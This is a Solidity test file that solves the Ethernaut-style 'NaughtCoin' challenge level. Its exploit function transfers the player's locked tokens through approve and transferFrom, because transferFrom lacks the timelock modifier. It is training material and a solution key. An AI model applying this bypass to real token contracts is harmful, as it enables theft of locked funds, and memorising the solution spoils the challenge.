// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/NaughtCoin.sol";
import "src/levels/NaughtCoinFactory.sol";

contract TestNaughtCoin is BaseTest {
    NaughtCoin private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new NaughtCoinFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance(true));
        level = NaughtCoin(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.balanceOf(player), level.INITIAL_SUPPLY());
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // We are blocked from transferring tokens until 10 years later.
        // Here of course we can just warp time to bypass the timelock.

        // But the real solution is about making a transferFrom call.
        // Even though we are block from transferring tokens, transferFrom is not overriden to have lockTokens modifier.
        // Therefore if we approve our tokens to ourselves, we can transferFrom them from our account to the contract.

        vm.startPrank(player, player);

        level.approve(player, level.balanceOf(player));
        level.transferFrom(player, address(level), level.balanceOf(player));

        vm.stopPrank();
    }
}
